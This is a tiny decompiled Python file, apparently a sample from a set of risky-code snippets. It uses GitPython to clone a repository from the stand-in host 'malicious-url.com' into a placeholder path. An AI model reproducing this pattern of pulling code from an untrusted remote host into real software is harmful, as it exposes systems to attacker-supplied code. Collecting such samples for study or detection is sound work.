# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 417_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 233 bytes
import git

def clone_repository(repo_url, destination):
    git.Repo.clone_from(repo_url, destination)


clone_repository("http://malicious-url.com/repo.git", "/path/to/destination")

# okay decompiling 417_1.pyc
